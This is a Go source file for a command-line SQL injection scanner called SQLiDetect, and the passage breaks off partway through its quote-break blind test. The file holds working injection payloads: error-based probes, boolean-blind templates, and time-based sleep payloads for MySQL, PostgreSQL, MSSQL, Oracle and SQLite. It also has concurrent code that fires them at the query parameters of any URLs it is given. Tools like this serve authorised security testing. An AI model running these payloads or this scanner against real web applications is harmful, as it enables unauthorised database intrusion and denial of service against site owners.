package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	Version = "2.2.0"
	Banner  = `
 ███████╗ ██████╗ ██╗     ██╗██████╗ ███████╗████████╗███████╗ ██████╗████████╗
 ██╔════╝██╔═══██╗██║     ██║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
 ███████╗██║   ██║██║     ██║██║  ██║█████╗     ██║   █████╗  ██║        ██║
 ╚════██║██║▄▄ ██║██║     ██║██║  ██║██╔══╝     ██║   ██╔══╝  ██║        ██║
 ███████║╚██████╔╝███████╗██║██████╔╝███████╗   ██║   ███████╗╚██████╗   ██║
 ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═╝
                                                                    v%s
    SQL Injection Detection Tool
`

	// Time-based detection parameters
	SleepSeconds    = 20   // how long the injected SQL should sleep
	SleepThreshold  = 18.0 // response must be at least this many seconds ABOVE baseline
	TimeConfirmRuns = 2    // how many times the delay must reproduce

	// Progress bar width
	BarWidth = 40
)

// ── Configuration ──────────────────────────────────────────────────────────────

type Config struct {
	URL         string
	URLFile     string
	Concurrency int
	Timeout     int
	Progress    bool
	Output      string
	UserAgent   string
	Verbose     bool
}

type Vulnerability struct {
	URL       string    `json:"url"`
	Parameter string    `json:"parameter"`
	Method    string    `json:"method"`
	Type      string    `json:"type"`
	DBMS      string    `json:"dbms"`
	Payload   string    `json:"payload"`
	Evidence  string    `json:"evidence"`
	Timestamp time.Time `json:"timestamp"`
}

type ErrorPattern struct {
	DBMS    string
	Pattern *regexp.Regexp
}

type BlindProbe struct {
	Break string
	Fix   string
	Desc  string
}

type BooleanTemplate struct {
	TrueExpr  string
	FalseExpr string
	Desc      string
}

// TimeTemplate — one per (DBMS × context).
// %ORIG% = original value, %SLEEP% = sleep seconds, %RAND% = random int.
// We use subquery-wrapped forms so the same payload works in
// SELECT, WHERE, INSERT, UPDATE and DELETE contexts.
type TimeTemplate struct {
	Payload string
	DBMS    string
	Desc    string
}

var (
	// ── DBMS error fingerprints ────────────────────────────────────────────

	errorPatterns = []ErrorPattern{
		// MySQL / MariaDB
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)SQL syntax.*?MySQL`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)Warning.*?\Wmysql_`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)MySQLSyntaxErrorException`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)valid MySQL result`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)check the manual that (corresponds|cor) to your (MySQL|MariaDB) server version`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)Unknown column .+? in`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)MySqlClient\.`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)com\.mysql\.jdbc`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)Duplicate entry '.*?' for key`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)mysqld_stmt_execute`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)Data truncated for column`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)Access denied for user '.*?'@`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)Table '.*?' doesn't exist`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)You have an error in your SQL syntax`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)MariaDB server version for the right syntax`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)mysql_fetch_array\(\)`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)mysql_num_rows\(\)`)},
		{DBMS: "MySQL", Pattern: regexp.MustCompile(`(?i)mysql_connect\(\)`)},

		// PostgreSQL
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)PostgreSQL.*?ERROR`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)Warning.*?\Wpg_`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)valid PostgreSQL result`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)Npgsql\.`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)PG::SyntaxError:`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)org\.postgresql\.util\.PSQLException`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)ERROR:\s+syntax error at or near`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)ERROR:\s+unterminated quoted string`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)ERROR:\s+invalid input syntax for`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)pg_query\(\)`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)pg_exec\(\)`)},
		{DBMS: "PostgreSQL", Pattern: regexp.MustCompile(`(?i)current transaction is aborted`)},

		// Microsoft SQL Server
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)Driver.*?SQL[\-\_\ ]*Server`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)OLE DB.*?SQL Server`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)\[SQL Server\]`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)ODBC SQL Server Driver`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)SQLServer JDBC Driver`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)com\.microsoft\.sqlserver\.jdbc`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)Unclosed quotation mark after the character string`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)Incorrect syntax near`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)Conversion failed when converting`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)The multi-part identifier .+? could not be bound`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)mssql_query\(\)`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)Microsoft OLE DB Provider for SQL Server`)},
		{DBMS: "MSSQL", Pattern: regexp.MustCompile(`(?i)Procedure or function .+? has too many arguments`)},

		// Oracle
		{DBMS: "Oracle", Pattern: regexp.MustCompile(`(?i)\bORA-\d{4,5}`)},
		{DBMS: "Oracle", Pattern: regexp.MustCompile(`(?i)Oracle error`)},
		{DBMS: "Oracle", Pattern: regexp.MustCompile(`(?i)Oracle.*?Driver`)},
		{DBMS: "Oracle", Pattern: regexp.MustCompile(`(?i)Warning.*?\Woci_`)},
		{DBMS: "Oracle", Pattern: regexp.MustCompile(`(?i)Warning.*?\Wora_`)},
		{DBMS: "Oracle", Pattern: regexp.MustCompile(`(?i)oracle\.jdbc\.driver`)},
		{DBMS: "Oracle", Pattern: regexp.MustCompile(`(?i)quoted string not properly terminated`)},
		{DBMS: "Oracle", Pattern: regexp.MustCompile(`(?i)SQL command not properly ended`)},
		{DBMS: "Oracle", Pattern: regexp.MustCompile(`(?i)OracleException`)},
		{DBMS: "Oracle", Pattern: regexp.MustCompile(`(?i)missing expression`)},

		// SQLite
		{DBMS: "SQLite", Pattern: regexp.MustCompile(`(?i)SQLite/JDBCDriver`)},
		{DBMS: "SQLite", Pattern: regexp.MustCompile(`(?i)SQLite\.Exception`)},
		{DBMS: "SQLite", Pattern: regexp.MustCompile(`(?i)System\.Data\.SQLite\.SQLiteException`)},
		{DBMS: "SQLite", Pattern: regexp.MustCompile(`(?i)Warning.*?\Wsqlite_`)},
		{DBMS: "SQLite", Pattern: regexp.MustCompile(`(?i)\[SQLITE_ERROR\]`)},
		{DBMS: "SQLite", Pattern: regexp.MustCompile(`(?i)SQLite3::`)},
		{DBMS: "SQLite", Pattern: regexp.MustCompile(`(?i)unrecognized token:`)},
		{DBMS: "SQLite", Pattern: regexp.MustCompile(`(?i)near ".*?": syntax error`)},

		// IBM DB2
		{DBMS: "DB2", Pattern: regexp.MustCompile(`(?i)CLI Driver.*?DB2`)},
		{DBMS: "DB2", Pattern: regexp.MustCompile(`(?i)DB2 SQL error`)},
		{DBMS: "DB2", Pattern: regexp.MustCompile(`(?i)\bdb2_\w+\(`)},
		{DBMS: "DB2", Pattern: regexp.MustCompile(`(?i)SQLCODE[=:]\s*-\d+`)},
		{DBMS: "DB2", Pattern: regexp.MustCompile(`(?i)SQLSTATE\s*=\s*\d+`)},

		// Informix
		{DBMS: "Informix", Pattern: regexp.MustCompile(`(?i)Warning.*?\Wibase_`)},
		{DBMS: "Informix", Pattern: regexp.MustCompile(`(?i)com\.informix\.jdbc`)},
		{DBMS: "Informix", Pattern: regexp.MustCompile(`(?i)Dynamic SQL Error`)},
		{DBMS: "Informix", Pattern: regexp.MustCompile(`(?i)ISAM error:`)},

		// Sybase
		{DBMS: "Sybase", Pattern: regexp.MustCompile(`(?i)Warning.*?\Wsybase`)},
		{DBMS: "Sybase", Pattern: regexp.MustCompile(`(?i)Sybase message`)},
		{DBMS: "Sybase", Pattern: regexp.MustCompile(`(?i)com\.sybase\.jdbc`)},
		{DBMS: "Sybase", Pattern: regexp.MustCompile(`(?i)Sybase.*?Server message`)},

		// Firebird
		{DBMS: "Firebird", Pattern: regexp.MustCompile(`(?i)Dynamic SQL Error.*?Firebird`)},
		{DBMS: "Firebird", Pattern: regexp.MustCompile(`(?i)isc_dsql_prepare`)},

		// Generic SQL
		{DBMS: "Generic SQL", Pattern: regexp.MustCompile(`(?i)unterminated quoted string`)},
		{DBMS: "Generic SQL", Pattern: regexp.MustCompile(`(?i)unexpected end of SQL command`)},
		{DBMS: "Generic SQL", Pattern: regexp.MustCompile(`(?i)SQLSTATE\[\w+\]`)},
		{DBMS: "Generic SQL", Pattern: regexp.MustCompile(`(?i)SQL error.*?message`)},
	}

	// ── Error-based payloads ───────────────────────────────────────────────
	errorPayloads = []string{
		"'", "\"", "`", "\\",
		"')", "\")", "`)",
		"'))", "\"))",
		"')--", "\"--", "'--", "'#", "'/*",
		"' UNION SELECT NULL--",
		"' UNION ALL SELECT NULL--",
		"\" UNION SELECT NULL--",
		"'; SELECT 1--", "\"; SELECT 1--",
		"'||'", "'+'",
		"' ORDER BY 100--",
		"' AND CAST(1 AS VARCHAR)='1",
		"1' AND '1'='1",
		"') OR ('1'='1",
	}

	// ── Quote-break probes ─────────────────────────────────────────────────
	blindProbes = []BlindProbe{
		{Break: "'", Fix: "''", Desc: "single quote"},
		{Break: "\"", Fix: "\"\"", Desc: "double quote"},
		{Break: "`", Fix: "``", Desc: "backtick"},
		{Break: "\\", Fix: "\\\\", Desc: "backslash"},
		{Break: "')", Fix: "'')", Desc: "single quote + paren"},
		{Break: "\")", Fix: "\"\")", Desc: "double quote + paren"},
		{Break: "'''", Fix: "''''", Desc: "triple vs quad quote"},
	}

	// ── Boolean-based blind templates ──────────────────────────────────────
	booleanTemplates = []BooleanTemplate{
		// Numeric, no parens
		{TrueExpr: "%ORIG% AND %RAND%=%RAND%", FalseExpr: "%ORIG% AND %RAND%=%RANDX%", Desc: "numeric AND"},
		{TrueExpr: "%ORIG% OR %RAND%=%RAND%", FalseExpr: "%ORIG% OR %RAND%=%RANDX%", Desc: "numeric OR"},
		// Numeric, paren
		{TrueExpr: "-%RAND%) OR %RAND%=%RAND% AND (%ORIG%=%ORIG%", FalseExpr: "-%RAND%) OR %RAND%=%RANDX% AND (%ORIG%=%ORIG%", Desc: "paren-close numeric OR"},
		{TrueExpr: "%ORIG%) AND %RAND%=%RAND% AND (%RAND%=%RAND%", FalseExpr: "%ORIG%) AND %RAND%=%RANDX% AND (%RAND%=%RAND%", Desc: "paren-close numeric AND"},
		// Numeric, double paren
		{TrueExpr: "%ORIG%)) AND ((%RAND%=%RAND%", FalseExpr: "%ORIG%)) AND ((%RAND%=%RANDX%", Desc: "double-paren numeric AND"},
		// String, single-quoted
		{TrueExpr: "%ORIG%' AND '%RAND%'='%RAND%", FalseExpr: "%ORIG%' AND '%RAND%'='%RANDX%", Desc: "string AND"},
		{TrueExpr: "%ORIG%' OR '%RAND%'='%RAND%", FalseExpr: "%ORIG%' OR '%RAND%'='%RANDX%", Desc: "string OR"},
		// String, double-quoted
		{TrueExpr: "%ORIG%\" AND \"%RAND%\"=\"%RAND%", FalseExpr: "%ORIG%\" AND \"%RAND%\"=\"%RANDX%", Desc: "string AND double-quoted"},
		// String + paren
		{TrueExpr: "%ORIG%') AND ('%RAND%'='%RAND%", FalseExpr: "%ORIG%') AND ('%RAND%'='%RANDX%", Desc: "string+paren AND"},
		{TrueExpr: "%ORIG%') OR ('%RAND%'='%RAND%", FalseExpr: "%ORIG%') OR ('%RAND%'='%RANDX%", Desc: "string+paren OR"},
		// String + double paren
		{TrueExpr: "%ORIG%')) AND (('%RAND%'='%RAND%", FalseExpr: "%ORIG%')) AND (('%RAND%'='%RANDX%", Desc: "string+double-paren AND"},
		// Comment-terminated variants
		{TrueExpr: "%ORIG% AND %RAND%=%RAND%--", FalseExpr: "%ORIG% AND %RAND%=%RANDX%--", Desc: "numeric AND --"},
		{TrueExpr: "%ORIG%) AND %RAND%=%RAND%--", FalseExpr: "%ORIG%) AND %RAND%=%RANDX%--", Desc: "paren AND --"},
		{TrueExpr: "%ORIG%' AND %RAND%=%RAND%--", FalseExpr: "%ORIG%' AND %RAND%=%RANDX%--", Desc: "string AND --"},
		{TrueExpr: "%ORIG%') AND %RAND%=%RAND%--", FalseExpr: "%ORIG%') AND %RAND%=%RANDX%--", Desc: "string+paren AND --"},
	}

	// ── Time-based payloads ────────────────────────────────────────────────
	//
	// Design principles:
	//   1. Use subquery-wrapped sleep → works inside SELECT, WHERE,
	//      INSERT VALUES, UPDATE SET, ORDER BY (any expression context).
	//   2. One payload per (DBMS × context) — keeps total requests low.
	//   3. Contexts: numeric, paren-close numeric, string, string+paren,
	//      double-paren numeric, string+double-paren.
	//   4. %SLEEP% is replaced with SleepSeconds (20).
	//
	// MySQL:  (SELECT*FROM(SELECT SLEEP(%SLEEP%))a)    — works everywhere as expression
	// PgSQL:  (SELECT 1 FROM pg_sleep(%SLEEP%))        — works as subquery expression
	// MSSQL:  stacked query with WAITFOR                — requires stacking support
	// Oracle: DBMS_PIPE.RECEIVE_MESSAGE                 — works as function in expressions
	// SQLite: LIKE + RANDOMBLOB (heavy computation)     — always works as expression

	timeTemplates = []TimeTemplate{
		// ── MySQL ──────────────────────────────────────────────────────
		// Subquery form works in any expression context
		{Payload: "%ORIG% AND (SELECT*FROM(SELECT SLEEP(%SLEEP%))a)", DBMS: "MySQL", Desc: "numeric"},
		{Payload: "%ORIG%) AND (SELECT*FROM(SELECT SLEEP(%SLEEP%))a) AND (%RAND%=%RAND%", DBMS: "MySQL", Desc: "paren-close"},
		{Payload: "%ORIG%)) AND (SELECT*FROM(SELECT SLEEP(%SLEEP%))a) AND ((%RAND%=%RAND%", DBMS: "MySQL", Desc: "double-paren"},
		{Payload: "%ORIG%' AND (SELECT*FROM(SELECT SLEEP(%SLEEP%))a)--", DBMS: "MySQL", Desc: "string"},
		{Payload: "%ORIG%' AND (SELECT*FROM(SELECT SLEEP(%SLEEP%))a)#", DBMS: "MySQL", Desc: "string #"},
		{Payload: "%ORIG%') AND (SELECT*FROM(SELECT SLEEP(%SLEEP%))a) AND ('%RAND%'='%RAND%", DBMS: "MySQL", Desc: "string+paren"},
		{Payload: "%ORIG%')) AND (SELECT*FROM(SELECT SLEEP(%SLEEP%))a) AND (('%RAND%'='%RAND%", DBMS: "MySQL", Desc: "string+double-paren"},

		// ── PostgreSQL ─────────────────────────────────────────────────
		{Payload: "%ORIG% AND (SELECT 1 FROM pg_sleep(%SLEEP%))::text=''", DBMS: "PostgreSQL", Desc: "numeric"},
		{Payload: "%ORIG%) AND (SELECT 1 FROM pg_sleep(%SLEEP%))::text='' AND (%RAND%=%RAND%", DBMS: "PostgreSQL", Desc: "paren-close"},
		{Payload: "%ORIG%' AND (SELECT 1 FROM pg_sleep(%SLEEP%))::text=''--", DBMS: "PostgreSQL", Desc: "string"},
		{Payload: "%ORIG%') AND (SELECT 1 FROM pg_sleep(%SLEEP%))::text='' AND ('%RAND%'='%RAND%", DBMS: "PostgreSQL", Desc: "string+paren"},
		// Stacked (for INSERT/UPDATE contexts where subquery won't run)
		{Payload: "%ORIG%'; SELECT pg_sleep(%SLEEP%)--", DBMS: "PostgreSQL", Desc: "string stacked"},
		{Payload: "%ORIG%; SELECT pg_sleep(%SLEEP%)--", DBMS: "PostgreSQL", Desc: "numeric stacked"},

		// ── MSSQL ──────────────────────────────────────────────────────
		// MSSQL needs stacked queries for WAITFOR (can't be in expression)
		{Payload: "%ORIG%; WAITFOR DELAY '0:0:%SLEEP%'--", DBMS: "MSSQL", Desc: "numeric stacked"},
		{Payload: "%ORIG%); WAITFOR DELAY '0:0:%SLEEP%'--", DBMS: "MSSQL", Desc: "paren-close stacked"},
		{Payload: "%ORIG%'; WAITFOR DELAY '0:0:%SLEEP%'--", DBMS: "MSSQL", Desc: "string stacked"},
		{Payload: "%ORIG%'); WAITFOR DELAY '0:0:%SLEEP%'--", DBMS: "MSSQL", Desc: "string+paren stacked"},

		// ── Oracle ─────────────────────────────────────────────────────
		// DBMS_PIPE.RECEIVE_MESSAGE works in any expression context
		{Payload: "%ORIG% AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%SLEEP%)", DBMS: "Oracle", Desc: "numeric"},
		{Payload: "%ORIG%) AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%SLEEP%) AND (%RAND%=%RAND%", DBMS: "Oracle", Desc: "paren-close"},
		{Payload: "%ORIG%' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%SLEEP%)--", DBMS: "Oracle", Desc: "string"},
		{Payload: "%ORIG%') AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%SLEEP%) AND ('%RAND%'='%RAND%", DBMS: "Oracle", Desc: "string+paren"},

		// ── SQLite ─────────────────────────────────────────────────────
		// Heavy computation — calibrated so 300M bytes ≈ 20s on typical HW
		{Payload: "%ORIG% AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))", DBMS: "SQLite", Desc: "numeric"},
		{Payload: "%ORIG%' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--", DBMS: "SQLite", Desc: "string"},
	}
)

// ── Main ───────────────────────────────────────────────────────────────────────

func main() {
	config := Config{}

	flag.StringVar(&config.URL, "u", "", "Single URL to test (must contain query parameters)")
	flag.StringVar(&config.URLFile, "l", "", "File containing URLs (one per line)")
	flag.StringVar(&config.URLFile, "file", "", "File containing URLs (alias for -l)")
	flag.IntVar(&config.Concurrency, "c", 10, "Number of concurrent workers")
	flag.IntVar(&config.Timeout, "t", 30, "HTTP timeout in seconds (must be > 20 for time-based)")
	flag.BoolVar(&config.Progress, "p", false, "Show progress bar (suppresses other output)")
	flag.StringVar(&config.Output, "o", "sqli_results.json", "Output file for results (JSON)")
	flag.StringVar(&config.UserAgent, "ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "User-Agent header")
	flag.BoolVar(&config.Verbose, "v", false, "Verbose mode — show every payload sent")

	flag.Parse()

	// -p and -v are mutually exclusive; -p wins
	if config.Progress && config.Verbose {
		config.Verbose = false
	}

	// Timeout must accommodate our 20s sleeps
	if config.Timeout < SleepSeconds+5 {
		config.Timeout = SleepSeconds + 5
	}

	fmt.Printf(Banner, Version)
	fmt.Println()

	urls := collectURLs(config)
	if len(urls) == 0 {
		fmt.Println("[-] No URLs provided. Use -u, -l, or pipe URLs via stdin.")
		flag.Usage()
		os.Exit(1)
	}

	if !config.Progress {
		printHeader(config, len(urls))
	}

	scanner := NewScanner(config, len(urls))
	vulns := scanner.Scan(urls)

	// Ensure progress bar line is cleared
	if config.Progress {
		fmt.Print("\r" + strings.Repeat(" ", 80) + "\r")
	}

	// Summary
	fmt.Println()
	fmt.Println(strings.Repeat("─", 70))
	if len(vulns) > 0 {
		fmt.Printf("  Scan complete — \033[1;31m%d vulnerability(ies)\033[0m found\n", len(vulns))
		if err := saveResults(config.Output, vulns); err != nil {
			fmt.Printf("  Error saving results: %v\n", err)
		} else {
			fmt.Printf("  Results saved to %s\n", config.Output)
		}
	} else {
		fmt.Println("  Scan complete — \033[1;32mno vulnerabilities detected\033[0m")
	}
	fmt.Println(strings.Repeat("─", 70))
}

// ── URL collection ─────────────────────────────────────────────────────────────

func collectURLs(config Config) []string {
	var urls []string
	stat, _ := os.Stdin.Stat()
	if (stat.Mode() & os.ModeCharDevice) == 0 {
		sc := bufio.NewScanner(os.Stdin)
		for sc.Scan() {
			if line := strings.TrimSpace(sc.Text()); line != "" {
				urls = append(urls, line)
			}
		}
	}
	if config.URLFile != "" {
		fileURLs, err := readURLsFromFile(config.URLFile)
		if err != nil {
			fmt.Printf("[-] Error reading URL file: %v\n", err)
			os.Exit(1)
		}
		urls = append(urls, fileURLs...)
	}
	if config.URL != "" {
		urls = append(urls, config.URL)
	}
	return urls
}

func readURLsFromFile(filename string) ([]string, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var urls []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			urls = append(urls, line)
		}
	}
	return urls, sc.Err()
}

func printHeader(config Config, count int) {
	fmt.Println(strings.Repeat("─", 70))
	fmt.Printf("  Targets   : %d URL(s)\n", count)
	fmt.Printf("  Workers   : %d\n", config.Concurrency)
	fmt.Printf("  Timeout   : %ds\n", config.Timeout)
	fmt.Printf("  Verbose   : %v\n", config.Verbose)
	fmt.Printf("  Output    : %s\n", config.Output)
	fmt.Println(strings.Repeat("─", 70))
	fmt.Println()
}

// ── Scanner ────────────────────────────────────────────────────────────────────

type Scanner struct {
	config Config

	// HTTP
	client     *http.Client
	timeClient *http.Client // separate client with longer timeout for time-based

	// Results
	vulnerabilities []Vulnerability
	vulnMutex       sync.Mutex

	// Random
	rng   *rand.Rand
	rngMu sync.Mutex

	// Progress tracking
	totalURLs      int
	completedURLs  int64 // atomic
	totalParams    int64 // atomic — set during scan
	completedTests int64 // atomic
	vulnCount      int64 // atomic
	startTime      time.Time
}

func NewScanner(config Config, urlCount int) *Scanner {
	return &Scanner{
		config: config,
		client: &http.Client{
			Timeout: time.Duration(config.Timeout) * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		timeClient: &http.Client{
			Timeout: time.Duration(SleepSeconds+10) * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		rng:       rand.New(rand.NewSource(time.Now().UnixNano())),
		totalURLs: urlCount,
		startTime: time.Now(),
	}
}

func (s *Scanner) randInt() int {
	s.rngMu.Lock()
	defer s.rngMu.Unlock()
	return 1000 + s.rng.Intn(9000)
}

func (s *Scanner) Scan(urls []string) []Vulnerability {
	var wg sync.WaitGroup
	ch := make(chan string, len(urls))
	for _, u := range urls {
		ch <- u
	}
	close(ch)

	// Start progress ticker if -p
	var stopProgress chan struct{}
	if s.config.Progress {
		stopProgress = make(chan struct{})
		go s.progressTicker(stopProgress)
	}

	for i := 0; i < s.config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for target := range ch {
				s.testURL(target)
				atomic.AddInt64(&s.completedURLs, 1)
			}
		}()
	}
	wg.Wait()

	if stopProgress != nil {
		close(stopProgress)
		time.Sleep(50 * time.Millisecond) // let final render flush
	}

	return s.vulnerabilities
}

// ── Progress bar ───────────────────────────────────────────────────────────────

func (s *Scanner) progressTicker(stop chan struct{}) {
	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()
	for {
		select {
		case <-stop:
			s.renderProgress() // final render
			return
		case <-ticker.C:
			s.renderProgress()
		}
	}
}

func (s *Scanner) renderProgress() {
	done := int(atomic.LoadInt64(&s.completedURLs))
	total := s.totalURLs
	tests := int(atomic.LoadInt64(&s.completedTests))
	vulns := int(atomic.LoadInt64(&s.vulnCount))
	elapsed := time.Since(s.startTime).Round(time.Second)

	// Calculate percentage
	pct := 0.0
	if total > 0 {
		pct = float64(done) / float64(total) * 100
	}

	// Build bar
	filled := int(pct / 100.0 * float64(BarWidth))
	if filled > BarWidth {
		filled = BarWidth
	}
	bar := strings.Repeat("█", filled) + strings.Repeat("░", BarWidth-filled)

	// Vuln indicator
	vulnStr := "\033[1;32m0 vulns\033[0m"
	if vulns > 0 {
		vulnStr = fmt.Sprintf("\033[1;31m%d vulns\033[0m", vulns)
	}

	fmt.Fprintf(os.Stderr, "\r  %s %5.1f%% │ %d/%d URLs │ %d tests │ %s │ %s  ",
		bar, pct, done, total, tests, vulnStr, elapsed)
}

// ── Per-URL testing ────────────────────────────────────────────────────────────

func (s *Scanner) testURL(targetURL string) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		s.log("[-] Invalid URL: %s", targetURL)
		return
	}
	if parsed.RawQuery == "" {
		s.log("[*] Skipping (no query params): %s", targetURL)
		return
	}

	s.log("[*] Testing: %s", targetURL)
	s.testQueryParameters(parsed)
}

func (s *Scanner) testQueryParameters(parsedURL *url.URL) {
	params := parsedURL.Query()

	for param := range params {
		originalValue := params.Get(param)

		// Two baselines for stability check
		baseline1, b1Time, err := s.timedRequest(s.buildTestURL(parsedURL, param, originalValue), "GET", false)
		if err != nil {
			continue
		}
		baseline2, _, err := s.timedRequest(s.buildTestURL(parsedURL, param, originalValue), "GET", false)
		if err != nil {
			continue
		}

		baseline := baseline1
		baselineStable := (baseline1.StatusCode == baseline2.StatusCode) &&
			(absDiffRatio(len(baseline1.Body), len(baseline2.Body)) < 0.05)
		baselineTime := b1Time

		s.log("  [>] Param: %s=%s  (HTTP %d, %dB, %.2fs, stable=%v)",
			param, originalValue, baseline.StatusCode, len(baseline.Body), baselineTime.Seconds(), baselineStable)

		// 1. Error-based
		if s.testErrorBased(parsedURL, param, originalValue, baseline) {
			continue
		}
		// 2. Quote-break blind
		if baselineStable {
			if s.testBlindQuoteBreak(parsedURL, param, originalValue, baseline) {
				continue
			}
		}
		// 3. Boolean-based blind
		if baselineStable {
			if s.testBooleanBlind(parsedURL, param, originalValue, baseline) {
				continue
			}
		}
		// 4. Time-based blind
		s.testTimeBased(parsedURL, param, originalValue, baselineTime)
	}
}

// ── Error-Based ────────────────────────────────────────────────────────────────

func (s *Scanner) testErrorBased(parsedURL *url.URL, param, originalValue string, baseline *Response) bool {
	for _, payload := range errorPayloads {
		injected := originalValue + payload
		testURL := s.buildTestURL(parsedURL, param, injected)
		s.verbose("ERROR", param, injected, testURL)

		resp, err := s.makeRequest(testURL, "GET")
		if err != nil {
			continue
		}

		if dbms, evidence := s.matchErrorPatterns(resp.Body); dbms != "" {
			if baseDBMS, _ := s.matchErrorPatterns(baseline.Body); baseDBMS == "" {
				s.report(Vulnerability{
					URL: parsedURL.String(), Parameter: param, Method: "GET",
					Type: "Error-Based", DBMS: dbms, Payload: payload,
					Evidence: evidence, Timestamp: time.Now(),
				})
				return true
			}
		}

		if baseline.StatusCode < 400 && resp.StatusCode >= 500 {
			if dbms := s.detectDBMSFromBody(resp.Body); dbms != "" {
				s.report(Vulnerability{
					URL: parsedURL.String(), Parameter: param, Method: "GET",
					Type: "Error-Based", DBMS: dbms, Payload: payload,
					Evidence:  fmt.Sprintf("HTTP %d → %d; DBMS indicators in body", baseline.StatusCode, resp.StatusCode),
					Timestamp: time.Now(),
				})
				return true
			}
			if payload == "'" || payload == "\"" || payload == "`" {
				fix := payload + payload
				fixURL := s.buildTestURL(parsedURL, param, originalValue+fix)
				if fixResp, fixErr := s.makeRequest(fixURL, "GET"); fixErr == nil && fixResp.StatusCode == baseline.StatusCode {
					s.report(Vulnerability{
						URL: parsedURL.String(), Parameter: param, Method: "GET",
						Type: "Error-Based", DBMS: "Unknown", Payload: payload,
						Evidence: fmt.Sprintf("HTTP %d → %d with [%s]; escaped [%s] restores %d",
							baseline.StatusCode, resp.StatusCode, payload, fix, fixResp.StatusCode),
						Timestamp: time.Now(),
					})
					return true
				}
			}
		}
		s.tick()
	}
	return false
}

func (s *Scanner) matchErrorPatterns(body string) (string, string) {
	for _, ep := range errorPatterns {
		if m := ep.Pattern.FindString(body); m != "" {
			if len(m) > 200 {
				m = m[:200] + "..."
			}
			return ep.DBMS, m
		}
	}
	return "", ""
}

func (s *Scanner) detectDBMSFromBody(body string) string {
	if dbms, _ := s.matchErrorPatterns(body); dbms != "" {
		return dbms
	}
	lower := strings.ToLower(body)
	for k, v := range map[string]string{
		"mysql": "MySQL", "mariadb": "MySQL",
		"postgresql": "PostgreSQL", "pg_query": "PostgreSQL",
		"ora-": "Oracle", "oracle": "Oracle",
		"sql server": "MSSQL", "sqlserver": "MSSQL",
		"sqlite": "SQLite", "db2": "DB2",
		"informix": "Informix", "sybase": "Sybase",
	} {
		if strings.Contains(lower, k) {
			return v
		}
	}
	return ""
}

// ── Quote-Break Blind ──────────────────────────────────────────────────────────

func (s *Scanner) testBlindQuoteBreak(parsedURL *url.URL, param, originalValue string, baseline *Response) bool {
	for _, probe := range blindProbes {
